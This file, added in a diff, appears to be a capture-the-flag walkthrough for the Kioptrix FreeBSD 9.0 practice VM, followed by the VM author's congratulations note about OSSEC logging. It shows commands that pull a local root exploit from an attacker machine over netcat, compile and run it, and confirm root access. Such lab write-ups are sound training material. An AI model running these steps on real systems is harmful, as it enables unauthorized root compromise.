@@ -1,0 +1,148 @@
+PRIVILEGE ESCALATION
+=====================
+ON ATTACKER MACHINE 
+===================
+We need to find a way to elevate our privileges, a quick search on our kali machine reveals
+an exploit that meets our kernel version, it was not what I thought it will be,
+this is about this vulnerability. https://www.exploit-db.com/exploits/26368/
+
+root@noondi:~# searchsploit freebsd 9.0
+--------------------------------------- ----------------------------------------
+ Exploit Title                         |  Path
+                                       | (/usr/share/exploitdb/)
+--------------------------------------- ----------------------------------------
+FreeBSD 9.0 - Intel SYSRET Kernel Priv | exploits/freebsd/local/28718.c
+FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Loca | exploits/freebsd/local/26368.c
+--------------------------------------- ----------------------------------------
+Shellcodes: No Result
+root@noondi:~# locate exploits/freebsd/local/26368.c
+/usr/share/exploitdb/exploits/freebsd/local/26368.c
+root@noondi:~# cp /usr/share/exploitdb/exploits/freebsd/local/26368.c /var/www/html/privesc/kioPriv5.c
+
+ON VICTIM MACHINE
+=================
+Download the exploit using wget however as you can see, it does not work.
+We will need another method, first thought netcat to the rescue.
+
+wget http://192.168.116.111/privesc/kioPriv5.c
+wget: not found
+
+which nc
+/usr/bin/nc
+
+================================ON ATTACKER MACHINE =====================
+UPLOAD THE EXPLOIT FROM YOUR KALI MACHINE ONTO VICTIM MACHINE USING NETCAT
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+After getting an error with WGET command we proceed to use netcat to download the 
+the privilege escalation on victim.
+root@noondi:~# nc -nlvp 443 < /var/www/html/privesc/kioPriv5.c 
+listening on [any] 443 ...
+connect to [192.168.116.111] from (UNKNOWN) [192.168.116.128] 37667
+
+nc -nv 192.168.116.111 443 > kioPriv5.c    
+Connection to 192.168.116.111 443 port [tcp/*] succeeded!
+
+gcc -o exploit kioPriv5.c
+kioPriv5.c:89:2: warning: no newline at end of file
+
+./exploit
+
+chmod 755 exploit
+
+ls -la
+total 88
+drwxrwxrwt   7 root   wheel   512 May 22 15:55 .
+drwxr-xr-x  18 root   wheel  1024 May 22 15:13 ..
+drwxrwxrwt   2 root   wheel   512 May 22 15:15 .ICE-unix
+drwxrwxrwt   2 root   wheel   512 May 22 15:15 .X11-unix
+drwxrwxrwt   2 root   wheel   512 May 22 15:15 .XIM-unix
+drwxrwxrwt   2 root   wheel   512 May 22 15:15 .font-unix
+-rw-------   1 www    wheel     0 May 21 12:08 apr6SArmD
+-rw-------   1 www    wheel     0 May 22 15:15 aprhgvwpm
+-rwxr-xr-x   1 www    wheel  8499 May 22 15:55 exploit
+-rw-r--r--   1 www    wheel  2213 May 22 15:53 kioPriv5.c
+srwxrwxrwx   1 mysql  wheel     0 May 22 15:15 mysql.sock
+drwxr-xr-x   2 root   wheel   512 Oct  7  2013 vmware-fonts0
+    
+
+./exploit
+
+id
+uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)
+ 
+whoami
+root
+
+
+cd /root
+ls -la
+total 96
+drwxr-xr-x   2 root  wheel   512 May 18 13:57 .
+drwxr-xr-x  18 root  wheel  1024 May 22 15:13 ..
+-rw-r--r--   2 root  wheel   793 Jan  3  2012 .cshrc
+-rw-------   1 root  wheel     0 Apr  6  2014 .history
+-rw-r--r--   1 root  wheel   151 Jan  3  2012 .k5login
+-rw-r--r--   1 root  wheel   299 Jan  3  2012 .login
+-rw-------   1 root  wheel     1 Mar 30  2014 .mysql_history
+-rw-r--r--   2 root  wheel   256 Jan  3  2012 .profile
+----------   1 root  wheel  2611 Apr  3  2014 congrats.txt
+-rw-r--r--   1 root  wheel  4278 May 22 15:55 folderMonitor.log
+lrwxr-xr-x   1 root  wheel    25 Mar 29  2014 httpd-access.log -> /var/log/httpd-access.log
+-rwxr-xr-x   1 root  wheel   574 Apr  3  2014 lazyClearLog.sh
+-rwx------   1 root  wheel  2366 Mar 28  2014 monitor.py
+lrwxr-xr-x   1 root  wheel    44 Mar 29  2014 ossec-alerts.log -> /usr/local/ossec-hids/logs/alerts/alerts.log
+
+
+cat congrats.txt
+If you are reading this, it means you got root (or cheated).
+Congratulations either way...
+
+Hope you enjoyed this new VM of mine. As always, they are made for the beginner in 
+mind, and not meant for the seasoned pentester. However this does not mean one 
+can't enjoy them.
+
+As with all my VMs, besides getting "root" on the system, the goal is to also
+learn the basics skills needed to compromise a system. Most importantly, in my mind,
+are information gathering & research. Anyone can throw massive amounts of exploits
+and "hope" it works, but think about the traffic.. the logs... Best to take it
+slow, and read up on the information you gathered and hopefully craft better
+more targetted attacks. 
+
+For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
+Knowing the OS gives you any idea of what will work and what won't from the get go.
+Default file locations are not the same on FreeBSD versus a Linux based distribution.
+Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".
+It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".
+Finding and knowing these little details will greatly help during an attack. Of course
+my examples are specific for this target, but the theory applies to all systems.
+
+As a small exercise, look at the logs and see how much noise you generated. Of course
+the log results may not be accurate if you created a snapshot and reverted, but at least
+it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.
+Default settings, nothing fancy but it should've logged a few of your attacks. Look
+at the following files:
+/root/folderMonitor.log
+/root/httpd-access.log (softlink)
+/root/ossec-alerts.log (softlink)
+
+The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
+files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS 
+for this.
+The httpd-access.log is rather self-explanatory .
+Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
+files. This one should've detected a few of your web attacks.
+
+Feel free to explore the system and other log files to see how noisy, or silent, you were.
+And again, thank you for taking the time to download and play.
+Sincerely hope you enjoyed yourself.
+
+Be good...
+
+
+loneferret
+http://www.kioptrix.com
+
+
+p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by
+default it would've blocked your IP (both in hosts.allow & Firewall) for
+600 seconds. I was nice enough to remove that part :)
